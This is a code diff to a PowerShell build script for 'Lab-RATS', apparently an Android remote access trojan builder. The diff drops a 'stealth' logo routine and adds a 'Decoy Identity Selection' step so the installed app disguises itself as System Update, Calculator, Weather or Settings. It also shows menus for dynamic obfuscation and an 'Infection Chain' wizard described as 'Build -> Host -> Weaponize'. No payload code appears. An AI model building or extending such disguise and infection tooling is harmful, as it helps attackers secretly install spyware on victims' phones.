@@ -13,8 +13,6 @@ $ErrorActionPreference = "Continue"
 $ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
 $ProjectDir = Split-Path -Parent $ScriptDir
 $ConfigFile = Join-Path $ScriptDir "build_config.txt"
-$DefaultLogo = Join-Path $ProjectDir "assets\app_logo.png"
-$CovertLogo = Join-Path $ProjectDir "assets\default_app_icon.png"
 
 # Default settings
 $DefaultSettings = @{
@@ -293,156 +291,6 @@ function New-Keystore {
     }
 }
 
-function Set-Logo {
-    Write-Host "[*] Logo Configuration" -ForegroundColor Cyan
-    Write-Host ""
-    
-    $resDir = Join-Path $ProjectDir "app\src\main\res"
-    
-    Write-Host "[>] Logo options:" -ForegroundColor Magenta
-    Write-Host "    1. Use Recommended System-Style Stealth logo (default_app_icon.png)"
-    Write-Host "    2. Use default Lab-RATS logo (app_logo.png)"
-    Write-Host "    3. Use custom logo (provide image path)"
-    Write-Host "    4. Skip (Keep project icons as is)"
-    Write-Host ""
-    
-    $logoOption = Read-Host "    Choose option (Default 1)"
-    if ([string]::IsNullOrEmpty($logoOption)) { $logoOption = "1" }
-    
-    $logoPath = $null
-    
-    switch ($logoOption) {
-        "1" {
-            if (Test-Path $CovertLogo) {
-                $logoPath = $CovertLogo
-                Write-Host "[OK] Using System-Style Stealth logo" -ForegroundColor Green
-            }
-            else {
-                Write-Host "[!] Stealth logo not found at: $CovertLogo" -ForegroundColor Red
-                return
-            }
-        }
-        "2" {
-            if (Test-Path $DefaultLogo) {
-                $logoPath = $DefaultLogo
-                Write-Host "[OK] Using default Lab-RATS logo" -ForegroundColor Green
-            }
-            else {
-                Write-Host "[!] Default logo not found at: $DefaultLogo" -ForegroundColor Red
-                return
-            }
-        }
-        "3" {
-            $customLogo = Read-Host "    Enter path to logo image (PNG, 512x512)"
-            if (Test-Path $customLogo) {
-                $logoPath = $customLogo
-            }
-            else {
-                Write-Host "[!] Logo file not found: $customLogo" -ForegroundColor Red
-                return
-            }
-        }
-        "4" {
-            Write-Host "[OK] No changes made to icons" -ForegroundColor Green
-            return
-        }
-    }
-    
-    if ($logoPath) {
-        Write-Host ""
-        $makeTransparent = Read-Host "    Make background transparent (removes white)? (y/N)"
-        $doTransparent = ($makeTransparent -eq "y" -or $makeTransparent -eq "Y")
-        
-        Write-Host "[*] Processing logo..." -ForegroundColor Cyan
-        
-        # KEY FIX: Remove launcher XMLs from anydpi to ensure PNGs are used
-        $adaptiveIconDir = Join-Path $resDir "mipmap-anydpi-v26"
-        if (Test-Path $adaptiveIconDir) {
-            Remove-Item -Path (Join-Path $adaptiveIconDir "ic_launcher.xml") -Force -ErrorAction SilentlyContinue
-            Remove-Item -Path (Join-Path $adaptiveIconDir "ic_launcher_round.xml") -Force -ErrorAction SilentlyContinue
-            Write-Host "[*] Optimized adaptive icon config for custom branding" -ForegroundColor Yellow
-        }
-        
-        # Load System.Drawing
-        Add-Type -AssemblyName System.Drawing
-        
-        $densities = @{
-            "mipmap-mdpi" = 48
-            "mipmap-hdpi" = 72
-            "mipmap-xhdpi" = 96
-            "mipmap-xxhdpi" = 144
-            "mipmap-xxxhdpi" = 192
-        }
-        
-        try {
-            $srcImage = [System.Drawing.Bitmap]::FromFile($logoPath)
-
-            foreach ($density in $densities.Keys) {
-                $size = $densities[$density]
-                $destPath = Join-Path $resDir "$density\ic_launcher.png"
-                $destPathRound = Join-Path $resDir "$density\ic_launcher_round.png"
-                
-                # Check dir exists
-                $destDirPath = Join-Path $resDir $density
-                if (-not (Test-Path $destDirPath)) {
-                    New-Item -ItemType Directory -Path $destDirPath | Out-Null
-                }
-                
-                # Create resized bitmap
-                try {
-                   $newImage = New-Object System.Drawing.Bitmap($size, $size)
-                   $graphics = [System.Drawing.Graphics]::FromImage($newImage)
-                   $graphics.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic
-                   $graphics.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::HighQuality
-                   $graphics.PixelOffsetMode = [System.Drawing.Drawing2D.PixelOffsetMode]::HighQuality
-                   $graphics.CompositingQuality = [System.Drawing.Drawing2D.CompositingQuality]::HighQuality
-
-                   # Draw resized (125% Zoom for Stealth Icon)
-                   if ($logoOption -eq "1") {
-                       $zoom = 1.25 # 125% Scale (Zoom In)
-                       $offset = ($size * ($zoom - 1)) / 2
-                       $graphics.DrawImage($srcImage, -$offset, -$offset, $size * $zoom, $size * $zoom)
-                   } else {
-                       $graphics.DrawImage($srcImage, 0, 0, $size, $size)
-                   }
-                   
-                   # Apply transparency if requested (Simple white replacement)
-                   if ($doTransparent) {
-                       $newImage.MakeTransparent([System.Drawing.Color]::White)
-                   }
-                   
-                   # Save
-                   $newImage.Save($destPath, [System.Drawing.Imaging.ImageFormat]::Png)
-                   $newImage.Save($destPathRound, [System.Drawing.Imaging.ImageFormat]::Png)
-                }
-                finally {
-                    if ($graphics) { $graphics.Dispose() }
-                    if ($newImage) { $newImage.Dispose() }
-                }
-            }
-            
-            $srcImage.Dispose()
-            Write-Host "[OK] Logo processed, resized, and saved to all densities" -ForegroundColor Green
-            if ($doTransparent) {
-                Write-Host "[OK] Applied transparency (White -> Transparent)" -ForegroundColor Green
-            }
-        }
-        catch {
-            Write-Host "[!] Error processing image: $_" -ForegroundColor Red
-            Write-Host "[*] Falling back to simple copy..." -ForegroundColor Yellow
-            
-            foreach ($density in $densities.Keys) {
-                $destPath = Join-Path $resDir "$density\ic_launcher.png"
-                Copy-Item $logoPath $destPath -Force
-                $destPathRound = Join-Path $resDir "$density\ic_launcher_round.png"
-                Copy-Item $logoPath $destPathRound -Force
-            }
-             Write-Host "[OK] Logo copied (No resizing/transparency applied due to error)" -ForegroundColor Yellow
-        }
-    }
-    Write-Host ""
-}
-
 function Set-AppConfig {
     Write-Host "[*] App Configuration" -ForegroundColor Cyan
     Write-Host ""
@@ -525,6 +373,30 @@ function Set-AppConfig {
     $config["APP_NAME"] = $appName
     $config["VERSION_NAME"] = $versionName
     $config["VERSION_CODE"] = $versionCode
+
+    # Decoy Identity Selection
+    Write-Host "[*] Decoy Identity Selection" -ForegroundColor Cyan
+    Write-Host "    (The app logo will transform into your selection immediately after install on device)" -ForegroundColor Yellow
+    Write-Host "    1. System Update (Gear)  2. Calculator"
+    Write-Host "    3. Weather               4. Settings"
+    Write-Host "    5. Lab-RATS Logo"
+    Write-Host ""
+    $decoyChoice = Read-Host "    Choice (Default 1)"
+    if ([string]::IsNullOrEmpty($decoyChoice)) { $decoyChoice = "1" }
+
+    $config["DECOY_CHOICE"] = $decoyChoice
+
+    $localProps = Join-Path $ProjectDir "local.properties"
+    if (Test-Path $localProps) {
+        $content = Get-Content $localProps
+        if ($content -match 'DECOY_CHOICE=') {
+            $content -replace 'DECOY_CHOICE=.*', "DECOY_CHOICE=$decoyChoice" | Set-Content $localProps
+        } else {
+            Add-Content $localProps "`nDECOY_CHOICE=$decoyChoice"
+        }
+    } else {
+        Set-Content $localProps "DECOY_CHOICE=$decoyChoice"
+    }
 
     # --- DYNAMIC OBFUSCATION PROTOCOL ---
     Write-Host "[*] Configuring Dynamic Obfuscation..." -ForegroundColor Cyan
@@ -867,7 +739,6 @@ function Invoke-InfectionWizard {
     # Build sequence
     if (-not (Test-Requirements)) { return }
     New-Keystore -AutoGenerate $true
-    Set-Logo
     Set-AppConfig
     Build-Apk
 
@@ -943,12 +814,11 @@ function Show-MainMenu {
     Write-Host ""
     Write-Host "    1. Start Build (Configure & Build)"
     Write-Host "    2. Generate Keystore Only"
-    Write-Host "    3. Configure Logo Only"
-    Write-Host "    4. Configure App Settings Only"
-    Write-Host "    5. Check/Install Requirements"
-    Write-Host "    6. Generate Infection Chain Package (Wizard)"
-    Write-Host "    7. Help / Documentation"
-    Write-Host "    8. Exit"
+    Write-Host "    3. Configure App Settings Only"
+    Write-Host "    4. Check/Install Requirements"
+    Write-Host "    5. Generate Infection Chain Package (Wizard)"
+    Write-Host "    6. Help / Documentation"
+    Write-Host "    7. Exit"
     Write-Host ""
     
     $option = Read-Host "    Choose option (Default 1)"
@@ -960,7 +830,6 @@ function Show-MainMenu {
         "1" {
             if (Test-Requirements) {
                 New-Keystore
-                Set-Logo
                 Set-AppConfig
                 Build-Apk
             }
@@ -971,34 +840,30 @@ function Show-MainMenu {
             }
         }
         "3" {
-            Set-Logo
-        }
-        "4" {
             Set-AppConfig
         }
-        "5" {
+        "4" {
             Test-Requirements | Out-Null
             Show-ManualJavaInstall
             Read-Host "Press Enter to return to menu"
         }
-        "6" {
+        "5" {
             Invoke-InfectionWizard
         }
-        "7" {
+        "6" {
             # Documentation
             Write-Banner
             Write-Host "COMMAND_DOCUMENTATION_V1.5.0" -ForegroundColor White
             Write-Host "------------------------------------------------------------"
             Write-Host "1. Start Build: Standard production flow."
             Write-Host "2. Keystore Only: Unique signing certificate."
-            Write-Host "3. Logo Only: Change app icons."
-            Write-Host "4. App Settings: Change ID, Name, and Version."
-            Write-Host "5. Requirements: Check Java setup."
-            Write-Host "6. Infection Wizard: Full Build -> Host -> Weaponize."
+            Write-Host "3. App Settings: Change ID, Name, and Version."
+            Write-Host "4. Requirements: Check Java setup."
+            Write-Host "5. Infection Wizard: Full Build -> Host -> Weaponize."
             Write-Host "------------------------------------------------------------"
             Read-Host "Press Enter..."
         }
-        "8" {
+        "7" {
             Write-Host "[*] Goodbye!" -ForegroundColor Cyan
             Write-Host "    Follow: https://github.com/K4N3CO/Lab-RATS" -ForegroundColor Magenta
             return
